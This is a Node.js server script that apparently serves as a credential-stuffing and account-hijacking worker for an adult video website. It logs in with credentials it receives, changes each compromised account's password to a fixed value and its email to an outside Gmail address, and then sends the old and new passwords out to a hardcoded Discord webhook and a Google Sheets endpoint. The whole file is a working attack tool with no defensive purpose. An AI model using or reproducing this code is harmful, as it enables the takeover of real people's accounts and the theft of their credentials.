import http from "node:http";

const DISCORD_SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1480118694674956329/n8r1xhEf1Xyw7fUE33LlBF1PS2IRyFRboW6E-U78DkzIAMGxLzK0Bx7VYHy3cgYAyhCf";
const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbwdAIV40A4sC9SWsIyXKC6uMJcgF1MGL6im_Vq9uxZT6HhHdS7CI5xUxFCLUzMLiKqPZw/exec";

const NEW_PASSWORD = "123aaa";
const NEW_EMAIL = "cuentadewapp1@gmail.com";

const LOGIN_HEADERS = {
  "accept": "*/*",
  "accept-language": "es-US,es;q=0.9",
  "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
  "origin": "https://www.camwhores.tv",
  "referer": "https://www.camwhores.tv/tags/cama/",
  "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-origin",
  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
  "x-requested-with": "XMLHttpRequest",
};

async function tryLogin(username, password) {
  const body = new URLSearchParams({
    username,
    pass: password,
    action: "login",
    email_link: "https://www.camwhores.tv/email/",
    format: "json",
    mode: "async",
  });

  const resp = await fetch("https://www.camwhores.tv/login/", {
    method: "POST",
    headers: LOGIN_HEADERS,
    body: body.toString(),
  });

  const setCookie = resp.headers.get("set-cookie") || "";
  const sessionCookie = setCookie.split(",").map(c => c.trim()).find(c => c.includes("PHPSESSID"));
  const cookieValue = sessionCookie ? sessionCookie.split(";")[0] : null;

  const text = await resp.text();
  console.log(`[LOGIN RAW] status=${resp.status} cookie=${cookieValue} body=${text.substring(0, 300)}`);

  let result;
  try {
    result = JSON.parse(text);
  } catch {
    result = { status: "error", raw: text.substring(0, 200) };
  }
  return { result, sessionCookie: cookieValue };
}

async function tryChangePassword(sessionCookie, oldPass, newPass) {
  const body = new URLSearchParams({
    old_pass: oldPass,
    pass: newPass,
    pass2: newPass,
    action: "change_pass",
    format: "json",
    mode: "async",
  });

  const resp = await fetch("https://www.camwhores.tv/change-password/", {
    method: "POST",
    headers: { ...LOGIN_HEADERS, referer: "https://www.camwhores.tv/my/", Cookie: sessionCookie + "; kt_member=1" },
    body: body.toString(),
  });

  const text = await resp.text();
  console.log(`[CHANGE PASS RAW] status=${resp.status} body=${text.substring(0, 300)}`);
  try { return JSON.parse(text); } catch {
    if (text.includes("success") || text.includes("has been changed")) return { status: "success" };
    return { status: "unknown", raw: text.substring(0, 200) };
  }
}

async function tryChangeEmail(sessionCookie, newEmail) {
  const body = new URLSearchParams({
    email: newEmail,
    action: "change_email",
    email_link: "https://www.camwhores.tv/email/",
    format: "json",
    mode: "async",
  });

  const resp = await fetch("https://www.camwhores.tv/change-email/", {
    method: "POST",
    headers: { ...LOGIN_HEADERS, referer: "https://www.camwhores.tv/my/", Cookie: sessionCookie + "; kt_member=1" },
    body: body.toString(),
  });

  const text = await resp.text();
  console.log(`[CHANGE EMAIL RAW] status=${resp.status} body=${text.substring(0, 300)}`);
  try { return JSON.parse(text); } catch {
    if (text.includes("success") || text.includes("has been changed") || text.includes("confirmation")) return { status: "success" };
    return { status: "unknown", raw: text.substring(0, 200) };
  }
}

async function sendToSheet(tab, data) {
  try {
    const resp = await fetch(GOOGLE_SHEET_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ tab, ...data }),
      redirect: "follow",
    });
    const text = await resp.text();
    console.log(`[SHEET] ${tab} -> status=${resp.status} body=${text.substring(0, 200)}`);
  } catch (e) {
    console.error("[SHEET ERROR]", e.message);
  }
}

async function sendToDiscord(webhookUrl, content, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const resp = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content }),
      });
      console.log(`[DISCORD] -> status=${resp.status}`);
      if (resp.status === 429) {
        const data = await resp.json().catch(() => ({}));
        const waitMs = (data.retry_after || 30) * 1000;
        console.log(`[DISCORD] Rate limited, waiting ${waitMs}ms...`);
        await new Promise(r => setTimeout(r, waitMs));
        continue;
      }
      return;
    } catch (e) {
      console.error("[DISCORD ERROR]", e.message);
      return;
    }
  }
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  if (url.pathname === "/process" && req.method === "POST") {
    let body = "";
    for await (const chunk of req) body += chunk;
    const { username, password, timestamp } = JSON.parse(body);

    console.log(`[PROCESS] ${username}`);

    let loginStatus = "error";
    let changePassStatus = "";
    let changeEmailStatus = "";

    try {
      const { result: loginResult, sessionCookie } = await tryLogin(username, password);
      loginStatus = loginResult?.status || "unknown";
      console.log(`[LOGIN] ${username} -> ${loginStatus}`);

      if (loginStatus === "success" && sessionCookie) {
        try {
          const passResult = await tryChangePassword(sessionCookie, password, NEW_PASSWORD);
          changePassStatus = passResult?.status || "unknown";
          console.log(`[CHANGE PASS] ${username} -> ${changePassStatus}`);
        } catch (e) {
          changePassStatus = "error";
        }

        try {
          const emailResult = await tryChangeEmail(sessionCookie, NEW_EMAIL);
          changeEmailStatus = emailResult?.status || "unknown";
          console.log(`[CHANGE EMAIL] ${username} -> ${changeEmailStatus}`);
        } catch (e) {
          changeEmailStatus = "error";
        }
      }

      // Success = login + password change. Email change is optional.
      if (loginStatus === "success" && changePassStatus === "success") {
        const emailNote = changeEmailStatus === "success" ? "YES" : "FAILED";
        await sendToSheet("successful", {
          username,
          original_password: password,
          new_password: NEW_PASSWORD,
          new_email: changeEmailStatus === "success" ? NEW_EMAIL : `FAILED (${changeEmailStatus})`,
          timestamp: timestamp || "",
        });

        await sendToDiscord(DISCORD_SUCCESS_WEBHOOK,
          `**[SUCCESS]** \`${username}\` | Old: \`${password}\` | New: \`${NEW_PASSWORD}\` | Email: ${emailNote}`
        );
        console.log(`[SUCCESS] ${username} (email: ${emailNote})`);
      }
    } catch (e) {
      loginStatus = "error";
      console.log(`[ERROR] ${username} -> ${e.message}`);
    }

    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ loginStatus, changePassStatus, changeEmailStatus }));
  } else if (url.pathname === "/health") {
    res.writeHead(200);
    res.end("ok");
  } else {
    res.writeHead(404);
    res.end("not found");
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Worker listening on port ${PORT}`));
